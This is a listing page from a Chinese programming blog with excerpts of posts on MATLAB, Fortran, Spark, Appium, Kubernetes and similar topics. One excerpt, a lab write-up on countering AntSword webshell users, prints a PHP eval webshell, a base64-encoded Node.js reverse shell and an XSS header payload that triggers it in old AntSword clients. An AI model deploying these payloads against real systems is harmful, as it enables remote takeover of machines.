	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44d2d4d3798c5b9761c49917792f7313/" rel="bookmark">
			118基于matlab的二级倒立摆的数学建模
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于matlab的二级倒立摆的数学建模，引入二次型最优控制率，对系统进行仿真分析，得出摆杆及小车位置变化曲线。程序已调通，可直接运行。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8445fcf344a4d69fab2840f1bc551ed7/" rel="bookmark">
			visual studio &#43; intel Fortran 错误解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		版本：VS2022 + intel Fortran 2024.0.2 Package ID: w_oneAPI_2024.0.2.49896
共遇到三个问题。 1.rc.exe not found 2.kernel32.lib 无法打开 3.winres.h 无法打开 我安装时参考的教程：visual studio和intel oneAPI安装与编写fortran程序_visual studio fortran-CSDN博客
出现这三个问题后查阅的解决方案：
Resolving the rc.exe not found error in Visual Studio 2022 - Visual studio
Solved: rc.exe not found - Intel Community
LINK: fatal error LNK1104: cannot open file 'kernel32.lib' - Intel Community
winapi - WindowsSdkDir is not set correctly in Visual Studio 2008? - Stack Overflow
最后，其实我遇到的3个问题都是同一个问题。也即Fortran的编译器找不到exe和include和lib。查阅了大量资料，启发最大的是
解决方案（但绝非最佳方案）：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8445fcf344a4d69fab2840f1bc551ed7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b55fc50fca5bef4575e49d2036281caf/" rel="bookmark">
			用 Node.js 写一个爬虫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		自己设计一个网站，然后去爬取别人家页面的数据来做一个自己的网站。哈哈哈，如果自己写着玩可能没啥事，但如果用这个网站来获利，你可能就要被寄律师函了，毕竟这有点‘刑’。这篇文章呢，就带大家爬取豆瓣TOP250电影的信息。豆瓣电影 Top 250 \(douban.com\)[1]
准备工作 通过指令npm init初始化文件夹，会获得package.json项目说明书。
爬虫必备工具：cheerio；通过在终端输入npm i cheerio，即可将文件装到项目里。cheerio 是 jquery 核心功能的一个快速灵活而又简洁的实现，主要是为了用在服务器端需要对 DOM 进行操作的地方。大家可以简单的理解为用来解析 html 非常方便的工具。
开始(细分七步) 用https模块(node直接提供给我们的)获取网站地址，通过get方法读取网站地址上的数据。
const https = require('https') https.get('https://movie.douban.com/top250', function (res) { let html = '' res.on('data', function (chunk) { //console.log(chunk + ''); //得到数据流，通过字符串拼接得到html结构 html += chunk }) 这样会读取到整个页面的html结构。
通过 res.on('end', function () {})，保证读取完了才会去做操作。
引入cheerio
const cheerio = require('cheerio')
获取html中的数据
const $ = cheerio.load(html) $('li .item').each(function () { const title = $('.title', this).text() const star = $('.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b55fc50fca5bef4575e49d2036281caf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c18b0119e734e55c5134fff31ef705f5/" rel="bookmark">
			精致旅游公司Treker网页设计 html模板
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、需求分析 旅游网站通常具有多种功能，以下是一些常见的旅游网站功能：
酒店预订：旅游网站可以提供酒店预订服务，让用户搜索并预订符合其需求和预算的酒店房间。
机票预订：用户可以通过旅游网站搜索、比较和预订机票，选择最方便和经济实惠的航班。
旅游套餐预订：旅游网站通常提供各种旅游套餐，包括景点门票、酒店住宿和交通安排等，用户可以选择适合自己的旅游套餐。
目的地信息：旅游网站通常提供关于不同目的地的详细信息，包括旅游景点、当地文化、美食和购物指南等，帮助用户做出决策并了解目的地。
用户评价和评论：旅游网站上的用户评价和评论可以帮助其他用户了解酒店、景点等的质量和服务水平，提供参考和建议。
旅游指南和攻略：旅游网站通常提供详细的旅游指南和攻略，包括行程安排、当地交通、必备物品等，帮助用户计划和安排旅行。
旅游资讯和新闻：旅游网站可能提供最新的旅游资讯和新闻，包括热门旅游目的地、特别活动和折扣信息等。
在线支付和预订管理：旅游网站通常提供在线支付功能，方便用户预订和支付旅行相关的费用，并提供预订管理工具，让用户查看和管理他们的旅行安排。
社交互动功能：一些旅游网站可能提供社交互动功能，让用户分享旅行经验、照片和建议，与其他旅行者互动和交流。
请注意，具体的旅游网站功能可能因网站的特性和定位而有所不同。以上列举的功能只是常见的一些例子，实际的旅游网站功能可能会更加丰富和多样化。
二、界面展示 1、Treker旅游网首页
2、旅游广告页面
3、查看旅游详情
4、旅游商品推荐
【商品明细】
【购物车】
【心愿单】
5、旅游地推荐
6、旅游最新新闻
7、查看旅游新闻
8、旅游目的地
9、展览栏
三、资源获取 资源连接：https://download.csdn.net/download/m0_46013789/88682008
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ead09d3aa1983cb5d2a1cd835cd85f3/" rel="bookmark">
			高可用分布式部署Spark、完整详细部署教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 Spark 是 UC Berkeley AMP Lab 开源的通用分布式并行计算框架。
Spark基于map reduce算法实现的分布式计算，拥有Hadoop MapReduce所具有的优点；但不同于MapReduce的是Job中间输出和结果可以保存在内存中，从而不再需要读写HDFS，因此Spark能更好地适用于数据挖掘与机器学习等需要迭代的map reduce的算法。
spark是基于内存计算框架，计算速度非常之快，但是它仅仅只是涉及到计算，并没有涉及到数据的存储，后期需要使用spark对接外部的数据源，比如hdfs。
Spark的四大特性 Simple（易用性）
Spark 提供了丰富的高级运算操作，支持丰富的算子，并支持 Java、Python、Scala、R、SQL 等语言的 API，使用户可以快速构建不同的应用。
开发人员只需调用 Spark 封装好的 API 来实现即可，无需关注 Spark 的底层架构。
Fast(速度快)
Spark 将处理的每个任务都构造成一个DAG（Directed Acyclic Graph, 有向无环图）来执行，实现原理是基于RDD（Resilient Distributed Dataset, 弹性分布式数据集）在内存中对数据进行迭代计算，以实现批量和流式数据的高性能快速计算处理。
Spark比MR速度快的原因
基于内存
mapreduce任务后期再计算的时候，每一个job的输出结果会落地到磁盘，后续有其他的job需要依赖于前面job的输出结果，这个时候就需要进行大量的磁盘io操作。性能就比较低。
spark任务后期再计算的时候，job的输出结果可以保存在内存中，后续有其他的job需要依赖于前面job的输出结果，这个时候就直接从内存中获取得到，避免了磁盘io操作，性能比较高
对于spark程序和mapreduce程序都会产生shuffle阶段，在shuffle阶段中它们产生的数据都会落地到磁盘。
进程与线程
mapreduce任务以进程的方式运行在yarn集群中，比如程序中有100个MapTask，一个task就需要一个进程，这些task要运行就需要开启100个进程。
spark任务以线程的方式运行在进程中，比如程序中有100个MapTask，后期一个task就对应一个线程，这里就不再是进程，这些task需要运行，这里可以极端一点：只需要开启1个进程，在这个进程中启动100个线程就可以了。
进程中可以启动很多个线程，而开启一个进程与开启一个线程需要的时间和调度代价是不一样。 开启一个进程需要的时间远远大于开启一个线程。## Scalable（可融合性）
Unified（通用性）
大数据处理的传统方案需要维护多个平台，比如，离线任务是放在 Hadoop MapRedue 上运行，实时流计算任务是放在 Storm 上运行。
而Spark 提供了一站式的统一解决方案，可用于批处理、交互式查询（Spark SQL）、实时流处理（Spark Streaming）、机器学习（Spark MLlib）和图计算（GraphX）等。这些不同类型的处理都可以在同一个应用中无缝组合使用。
Scalable(兼容性)
Spark 可以非常方便地与其他的开源产品进行融合。比如：Spark 可以使用 Hadoop 的 YARN 和 Apache Mesos 作为它的资源管理和调度器；可以处理所有 Hadoop 支持的数据，包括 HDFS、HBase 和 Cassandra 等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7ead09d3aa1983cb5d2a1cd835cd85f3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b3f12354a8905c3c5b1a9c89776236ba/" rel="bookmark">
			[1255]使用Uiautomotorviewer无法获取手机页面元素
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android 9 使用Uiautomotorviewer无法获取手机页面元素，提示Unexpected error while obtaining UI hierarchy java.lang.reflect.InvocationTargetException
（亲试有用）Android app 元素定位除了使用Appium Inspector 外，还可以使用Android SDK 里tools中的uiautomatorviewer 工具。但今天打算使用 uiautomatorviewer 进行元素定位的时候，发现无法截图，并报如下错误：
Unexpected error while obtaining UI hierarchy # 点击Details java.lang.reflect.InvocationTargetException 查找资料了解到，从Android 8.0开始，SDK 工具软件包在新版本中已经弃用，所以tools里的uiautomatorviewer工具都不支持了。于是开始查找解决方法。
1，使用adb命令截图，再导入uiautomatorviewer进行定位。这种方法虽然可行，但太麻烦了。
2，下载修改过的 uiautomatorviewer.bat，将tools里的uiautomatorviewer.bat文件替换掉。但在某博客网站上居然需要money才能下载，表示谴责…
3，将SDK目录中tools文件夹下lib中的ddmlib、ddms、ddmuilib 、uiautomatorviewer这四个jar文件替换掉即可。
下面是这四个新文件的下载地址：
链接: https://pan.baidu.com/s/1YIHPgRSOL_mBgR1LG9ZYLQ
提取码: 888q
替换完成后，重新打开tools中uiautomatorviewer.bat即可进行元素定位。
参考：https://www.cnblogs.com/puhongjun/p/14844510.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8dcd860b8d5524365f022eebf375a28/" rel="bookmark">
			[1254]Java常用jar命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 java打jar包命令使用命令行方式：使用Ant构建工具：使用Maven构建工具： jar常用指令将class文件打包成jar包解压jar包查看jar包内的文件清单新增或更新jar包内的文件执行jar java打jar包命令 在Java中，可以使用以下命令将代码打包为jar包：
使用命令行方式： 使用javac命令编译源代码文件为class文件：javac MyClass.java
使用jar命令创建jar包：jar cf myJar.jar MyClass.class
这将编译MyClass.java文件并将生成的class文件打包到名为myJar.jar的jar包中。
使用Ant构建工具： 在Ant构建脚本中，可以使用任务来打包代码为jar包。例如：
&lt;project name="MyProject" default="build"&gt; &lt;target name="build"&gt; &lt;javac srcdir="src" destdir="bin"/&gt; &lt;jar destfile="myJar.jar" basedir="bin"/&gt; &lt;/target&gt; &lt;/project&gt; 这将编译src文件夹中的源代码，并将生成的class文件打包到名为myJar.jar的jar包中。
使用Maven构建工具： 在Maven项目的pom.xml文件中，可以使用maven-jar-plugin插件来打包代码为jar包。例如：
&lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt; &lt;version&gt;3.2.0&lt;/version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;/source&gt; &lt;target&gt;1.8&lt;/target&gt; &lt;/configuration&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 这将使用Maven的默认目录结构，编译源代码并将生成的class文件打包到target目录中的jar包中。
请注意，以上提供的代码示例只是其中一种实现方法，在确保执行正确的前提下，可以根据具体情况选择适合的方法。
jar常用指令 jar命令参数：
jar命令格式：jar {c t x u f }[ v m e 0 M i ][-C 目录]文件名... 其中{ctxu}这四个参数必须选选其一。[v f m e 0 M i ]是可选参数，文件名也是必须的。 -c 创建一个jar包 -t 显示jar中的内容列表 -x 解压jar包 -u 添加文件到jar包中 -f 指定jar包的文件名 -v 生成详细的报造，并输出至标准设备 -m 指定manifest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8dcd860b8d5524365f022eebf375a28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17e2427ff7b958818842bc65404df420/" rel="bookmark">
			[1253].class文件转换为.java文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 方法一：使用Java反编译工具方法二：使用Java反射机制 将.class文件转换为.java文件的方法有两种：
方法一：使用Java反编译工具 下载并安装Java反编译工具，比如JD-GUI、Fernflower等。
打开反编译工具，选择要转换的.class文件。
点击反编译按钮，工具会将.class文件转换为对应的.java文件。
方法二：使用Java反射机制 使用Java反射机制，通过Class类的getResourceAsStream()方法获取.class文件的输入流。
使用ASM库或其他类似的字节码操作库，将输入流中的字节码转换为对应的.java文件。
以下是使用Java反射机制的示例代码：
import java.io.FileOutputStream; import java.io.IOException; import java.io.InputStream; import java.lang.reflect.Method; public class ClassToJavaConverter { public static void main(String[] args) { try { // 获取要转换的.class文件的输入流 InputStream inputStream = ClassToJavaConverter.class.getResourceAsStream("YourClass.class"); // 创建输出流，将字节码写入.java文件 FileOutputStream outputStream = new FileOutputStream("YourClass.java"); // 读取输入流中的字节码，并写入输出流 byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = inputStream.read(buffer)) != -1) { outputStream.write(buffer, 0, bytesRead); } // 关闭输入流和输出流 inputStream.close(); outputStream.close(); System.out.println("转换成功！"); } catch (IOException e) { e.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17e2427ff7b958818842bc65404df420/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7572f5fd04ac90e138fa7d100aa3354c/" rel="bookmark">
			[605]appium操作多台手机及常见问题汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 如何区分多台手机appium导致微信聊天记录被清空常见问题汇总问题1问题2问题3问题4问题5问题6问题7问题8问题9问题10问题11 如何区分多台手机 每次启动能不不清除缓存,我每次都要重新登陆账号好麻烦?中文输入为什么是乱码?如果电脑连接了多台设备,但我只想控制指定一台,怎么区分?swip()方法滑动太慢了,有没有更快速的方法滑动? 针对前三个问题,在desired_caps中增加以下四个配置即可解决,此配置同样适用于Appium桌面版的配置.
desired_caps = { "platformName": "Android", "platformVersion": "6.0.1", "deviceName": "sansan",# "appPackage": "com.immomo.momo", "appActivity": ".android.activity.WelcomeActivity", 'unicodeKeyboard': True, # 使用unicodeKeyboard,即Appiuum自带键盘 'resetKeyboard': True, # 重新设置系统键盘为Appium自带键盘 'noReset': True, # 每次启动不重置APP,即不执行清空APP数据操作 'udid': 'be7c2d7f'# 区分多台手机 } 另外再详细说一下最后一项配置,即:
'udid': 'be7c2d7f' 打个比方:
你的电脑上边了连接了三台手机，那么你执行adb devices 会出现三台手机，
那么你的脚本就必须要指定udid 来说明你要控制具体哪一台手机，
如果不指定，也不会同时控制三台，只会默认控制第一台。
udid的value：你输入adb devices 后终端出现的那段字符串如下：
be7c2d7f devcie a38f89f9 devcie c3sji4lw devcie 直接粘贴就好，要控制哪一台就粘贴哪一条。
针对最后一个问题
Appium自带方法中有一个flick()方法
driver.swipe(495, 1530, 495, 433) # 页面只滑动一下 driver.flick(495, 1530, 495, 433) # 页面作匀减速直线运动 swip()方法：按住坐标(495,1530)手指不松，移动到(495,433)，然后松开手指。页面在你手指松开时，就立即静止。类似于你开车到目标点后急刹车…
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7572f5fd04ac90e138fa7d100aa3354c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/382ba4df51a3fdd01110c4163a14d1f5/" rel="bookmark">
			关于蚁剑（AntSword）的溯源反制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中国蚁剑(AntSword) RCE漏洞
此漏洞在AntSword2.7.1版本上修复 ，所以适用于AntSword2.7.1以下版本。
下面介绍被低版本蚁剑攻击后如何进行溯源反打
以物理机为攻击机，虚拟机kali模拟受害者，之后使用kali进行溯源反制
物理机内网ip地址：192.168.249.1
虚拟机ip地址：192.168.249.128
启用kali的Apache服务，用于模拟一个对外开放的服务
systemctl start apache2 在物理机上进行测试，可以访问到该服务
假设受害者的服务器成功地被我们上传了一个木马
&lt;?php @eval($_POST['cmd']);?&gt; 此时攻击者便会使用蚁剑来连接获取shell
我这里使用的蚁剑版本是2.1.15的（2.7.1以下的都会存在这个漏洞）
连接成功
现在攻击者便可以查看和操作我们所有的文件
或者使用虚拟终端进行命令执行
如果我们发现了这个shell，我们该如何反击呢？下面介绍利用蚁剑存在的漏洞进行反溯源。
首先对shell.php进行修改测试
测试内容：
&lt;?php header("HTTP/1.1 500 &lt;img src=1 onerror=alert('nibeisuyuanle!') /&gt;") ?&gt; 那么攻击者再次尝试连接时就会出现弹窗提示对方被溯源
我们还可以进一步对代码进行修改
利用nodejs库反弹shell
var net = require("net"); var cmd = require("child_process").exec("cmd.exe"); var socket = new net.Socket(); socket.connect(1971, "192.168.249.128", function(){ socket.pipe(cmd.stdin); cmd.stdout.pipe(socket); cmd.stderr.pipe(socket); }); 对其进行base64加密得到
dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpOwp2YXIgY21kID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImNtZC5leGUiKTsKdmFyIHNvY2tldCA9IG5ldyBuZXQuU29ja2V0KCk7CnNvY2tldC5jb25uZWN0KDE5NzEsICIxOTIuMTY4LjI0OS4xMjgiLCBmdW5jdGlvbigpewogICAgc29ja2V0LnBpcGUoY21kLnN0ZGluKTsKICAgIGNtZC5zdGRvdXQucGlwZShzb2NrZXQpOwogICAgY21kLnN0ZGVyci5waXBlKHNvY2tldCk7Cn0pOw== 通过javascript的eval函数来调用
eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpOwp2YXIgY21kID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImNtZC5leGUiKTsKdmFyIHNvY2tldCA9IG5ldyBuZXQuU29ja2V0KCk7CnNvY2tldC5jb25uZWN0KDE5NzEsICIxOTIuMTY4LjI0OS4xMjgiLCBmdW5jdGlvbigpewogICAgc29ja2V0LnBpcGUoY21kLnN0ZGluKTsKICAgIGNtZC5zdGRvdXQucGlwZShzb2NrZXQpOwogICAgY21kLnN0ZGVyci5waXBlKHNvY2tldCk7Cn0pOw==`,`base64`).toString()) 构造payload
&lt;?php header("HTTP/1.1 500 &lt;img src=1 onerror=eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpOwp2YXIgY21kID0gcmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWMoImNtZC5leGUiKTsKdmFyIHNvY2tldCA9IG5ldyBuZXQuU29ja2V0KCk7CnNvY2tldC5jb25uZWN0KDE5NzEsICIxOTIuMTY4LjI0OS4xMjgiLCBmdW5jdGlvbigpewogICAgc29ja2V0LnBpcGUoY21kLnN0ZGluKTsKICAgIGNtZC5zdGRvdXQucGlwZShzb2NrZXQpOwogICAgY21kLnN0ZGVyci5waXBlKHNvY2tldCk7Cn0pOw==`,`base64`).toString()) /&gt;") ?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/382ba4df51a3fdd01110c4163a14d1f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17fb00925c8f8f4bfb42e6838a344d38/" rel="bookmark">
			使用Kotlin协程制作一个计时工具类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java回调的痛 Android在几年前普遍都使用Java开发。现在在Google宣布“Kotlin First”之后，加上不断高涨的Kotlin User数量，现在开始往kt转变了。Java语言，广为大家吐槽的一点就是异步操作需要通过回调来设置，而且还要特别注意线程切换，一不小心就会报：
Only the original thread that created a view hierarchy can touch its views 例如，我此前做过的一个弹窗倒计时更新按钮状态的需求，就要经历初始化一个倒计时工具类，然后设置回调，回调里写逻辑，最后再调用开始start。就像下面这样，设置过程中产生一堆override的回调，极其不美观。
CountDownUtils count = new CountDownUtils(5, 1000); count.setTimerCallBack(new CountDownUtils.OnTimerCallBack() { @Override public void onStart() { btn_close.setClickable(false); btn_close.getBackground().setAlpha(88); btn_close.setTextColor(Color.argb(80, 0xff, 0xff, 0xff)); btn_close.setText("关闭 5s"); } @Override public void onTick(int times) { btn_close.setText("关闭 " + times + "s"); } @Override public void onFinish() { btn_close.getBackground().setAlpha(255); btn_close.setTextColor(Color.argb(255, 0xff, 0xff, 0xff)); btn_close.setClickable(true); btn_close.setText("关闭"); } }); count.start(); 后来又出了RxJava这个强大的异步库，但是其使用也过于复杂，各种操作符又有比较高的学习成本，做一个简单的倒计时的需求还用不上这个工具。在学习Kotlin之后，开始着手自己设计了一个简单的倒计时的工具类。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/17fb00925c8f8f4bfb42e6838a344d38/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2dcb44632bea9c2429fe22aa1e955b6/" rel="bookmark">
			模型 逻辑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本系列文章 主要是 分享 思维模型，涉及各个领域，重在提升认知。明辨是非，识别真相。
1 模型故事 1.1 逻辑 与 谎言 一顾客问营业员：“这件衣服真是现在最流行的吗？”营业员说：“这是现在最流行的时装！” 顾客说：“太阳晒了不退色吗？”营业员说：“瞧您说的，这件衣服在橱窗里挂了三年了，到现在还像新的一样。”至此，这位顾客可以看出这个营业员的回答自相矛盾，从而得出这件衣服是过时的结论。推而广之，日常生活中我们都可以运用矛盾来试探生活中的真假，运用逻辑学来揭穿谎言。
1.2 逻辑 与 杠精 元宵节，一女子想到灯市观灯，其丈夫说:“家中已点灯了。”该女子怒道:“我不仅想观灯，而且还想观人。”其丈夫也怒道:“老子难道是鬼吗?” 此灯非彼灯，此人非彼人，这就是整个过程中的偷换概念。
1.3 逻辑 与 信息判定 曾经有一则新闻报道：在美国出生的正常婴儿在 3 个月大时平均体重是 12~14 磅。因此，如果一个 3 个月大的小孩体重只有 10 磅，那么他的体重增长低于美国平均水平。注意：这里实际上只能推断出 3 个月得儿童 的体重值 低于美国平均水平 而不是 体重增长低于美国平均水平。
1.4 逻辑 与 思考（常用于面试题） 如果你是一位出租车司机，你把乘客送到机场，可以选择空车返回，或原地等待出站的乘客，你觉得哪种选择更加明智？（考察：能否收集重要信息以及思考的方法和思路）
逻辑突破点：先询问当前航班的间隔时间和客流量，在掌握足够信息之后再对其进行分析和判断。
面试题：美国有多少个加油站？（考察：以怎样的思考方式和方法，或者从哪个角度入手解决这个问题。）
逻辑突破口：美国有多少辆汽车。分析如下：美国人口有2.75亿左右，假设平均每个家庭规模2.5人，那么总共有1.1亿家庭，假设平均每个家庭拥有1.8辆汽车，那么美国总共约1.98亿辆汽车，然后计算1.98亿小汽车需要多少个加油站来服务。
1.5 逻辑 故事与推理 故事：亨利应一位富家独生女之邀，和她的堂姐以及堂姐的未婚夫 一个外科医生，4人一起到郊外的别墅野餐。小巧轻盈的富家女，双亲都已去世，由她继承了巨额家产。到达别墅后，他们在庭院的草地上野餐。他们带了3个大篮子，内中装满食物。吃饱后，篮子就收到别墅中。亨利在与堂姐谈天时，富家女和外科医生一起进了别墅。好久也不见他们出来。堂姐进屋察看。发现里面空无一人。当亨利也想进屋时，外科医生从另一边的树林 里出来了。他一身泥巴，在摘野草莓。亨利问他富家女在哪里，他说在屋里。然而当他们3人进屋去时，却无论如何也找不到富家女，而且门窗都是从里面锁住的。 亨利找来找去，只是在走廊上捡到一块防水布片。3人失望地将别墅收拾整齐，把大篮子放回车上，离开了。后来警察又进行了仔细的检查，只在浴室里看到了一点血迹。富家女到哪里去了呢？她被谋杀了吗？尸体呢？凶手又是谁呢？
推理：其实线索在原文就已给出了，堂姐先进屋察看，她是帮凶，是她反锁的门。所以凶手是堂姐和她的未婚夫。当富家女和外科医生进入别墅后，医生便杀了她，在浴室里肢解了尸体，用防水布包着，放进大篮子里。因为被害者很娇小，重量轻，不易被发觉。
1.6 逻辑 与 防骗故事 骗子团伙冒充中国驻英国大使馆，说留学生涉嫌一起以及保险金融洗钱案，要求留学生联系国内公安，大使馆收到公安结案文件后才能继续留在英国念书。在外求学的孩子本身初到陌生之地都颇为紧张。最终，该留学生在慌乱的情况下损失了原本用来支付学费的26万多元。这并不是一笔小数目，可想孩子当时独自在异地的绝望和无助。之所以留学生骗局屡屡得手，主要是利用了孩子初到异地/异国的不熟悉感，再刻意营造紧张的氛围，让人在短时间内无法做出理性的思考。就是在这样高度紧绷的状态下，很多人都会慌乱，难免会忽略很多漏洞。很多网友在下面留言，自己也遇到了相同的骗局，但因为一眼看穿了骗局的漏洞，便逃过一劫。我们冷静地用正常逻辑来看一看这个骗局，其中有一个最大的漏洞：正常情况下，如果警察把某人列为嫌疑人，是不会先电话通知嫌疑人，并透露案件的相关内容，而是直接上门进行传唤。否则一个电话打草惊蛇了，不怕你跑路吗？听完这样的分析，是不是有种恍然大悟的感觉？原来事件的违和感在这里。如果平时习惯用逻辑来思考问题，或许孩子就可以在关键时刻看穿骗局，保护自己。
这是在英国时碰到的一个事儿。某日放学回家路上，D被一个英国老太当街拉住，问他借打车回家的出租车钱。当时D下意识问她：“附近这么多英国本地人，你为什么向我一个外国人求助呢？”因为正常来说，我们求助时会倾向去找同一国家的人，可以更好地沟通。她当时就被我问住了，愣了一下说：“因为本地人都太抠门。”D说：“我没零钱，不过我可以陪你找警察求助。”（因为警察局就在附近，5分钟不到的路程）她一听立刻转身走了。D也松了一口气，保住了自己的“钱包”。
逻辑 与 教育培养
孩子的逻辑培养黄金期大约在5-6岁。在这段时间里，孩子问“为什么”的频率明显提升，并喜欢将自己的想象力和怎么做联系起来。所以，爸妈们可以利用这一时期，来鼓励孩子自己去思考和解开这些“为什么”谜题，不要直接告诉孩子答案。有了思考的过程，孩子才会举一反三，将它用在别的难题中，也会更加理性和积极地面对压力和困难。详细的方法 链接如下：一个万能公式教你回答孩子的「十万个为什么」，培养逻辑思维
同时如果你想了解 更多关于逻辑学方面的知识，那么可以参考下面两个系列的文章，列表如下：
专题分纲目录 形式逻辑
形式逻辑（01）你的逻辑怎么样？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2dcb44632bea9c2429fe22aa1e955b6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00d7c16bf12556f652842d6676e85d0b/" rel="bookmark">
			【K8S in Action】副本机制与控制器：部署托管的Pod
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过控制器来运行托管的 pod，Pod失败的时候自动重新启动它们。
1. 保持pod健康 从外部检查应用程序的运行状况:
HTTPGET探针对容器的 IP 地址TCP套接字探针尝试与容器指定端口建立TCP连接Exec探针在容器内执行任意命令，并检查命令的退出状态码。如果状态码是 0, 则探测成功。 务必记得设置一个初始延迟未说明应用程序的启动时间。
livenessProbe: httpGet: HTTPGET探针 path: / 请求路径 port： 8080 请求端口 initialDelaySeconds: 15 初始延迟，应用启动后15s开始探测请求 # 获取崩溃容器的应用日志， 即上一个容器的日志 kubectl logs mypod --previous # describe的内容来了解为什么必须重启容器 kubectl describe po kubia-liveness 1.1 describe 结果解释 退出代码为137, 这有特殊的含义 —-表示该进程由外部信号终止。数字137是两个数字的总和：128+x, 其中x是终止进程的信号编号。
在这个例子中，x等于9, 这是SIGKILL 的信号编号，意味着这个进程被强行终止。
delay(延迟）delay=0s部分显示在容器启动后立即开始探测timeout(超时）设置为1秒，因此容器必须在1秒内进行响应， 不然这次
探测记作失败period(周期）等。在探测连续三次失败(#failure= 3)后重启容器。
2 了解ReplicationController ReplicationController旨在创建和管理一个pod的多个副本。确保pod的数量始终与其标签选择器匹配。
ReplicationController有三个主要部分：
label selector ( 标签选择器）， 用于确定ReplicationController作用域中有哪些Podreplica count (副本个数）， 指定应运行的pod 数量pod template (pod模板）， 用于创建新的pod 副本 一些命令缺少命名空间，补上即可使用
kubectl create -f kubia-rc.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/00d7c16bf12556f652842d6676e85d0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d73d5b2faa5241a28850df41f6b11b67/" rel="bookmark">
			macos下转换.dmg文件为 .iso .cdr文件的简单方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为了让镜像文件在mac 和windows平台通用, 所以需要将.dmg格式的镜像文件转换为.iso文件, 转换方法也非常简单, 一行命令即可
hdiutil convert /path/to/example.dmg -format UDTO -o /path/to/example.iso 转换完成后的文件名称默认是 example.iso.cdr 这里直接将.cdr后缀删除即可
另外一个方法也可以通过mac系统中的 磁盘工具.app 来转换dmg为cdr/iso格式镜像, 方法如下:
1. 加载.dmg镜像;
2. 打开 磁盘工具.app 选择 文件 --&gt; 新建映像--&gt; 基于 xxx 新建映像 然后选择保存路径和名称即可, 格式选择 DVD/CD主映像 然后保存后镜像的格式就是 .cdr / .iso 格式了.
下图以 CleanShot_X_4_6_2.dmg 镜像转换为 CleanShot_X_4_6_2.iso 镜像为例
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69fb65177a0e426f0967c6df7f23c4c0/" rel="bookmark">
			2023令我惊叹的C&#43;&#43;代码用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
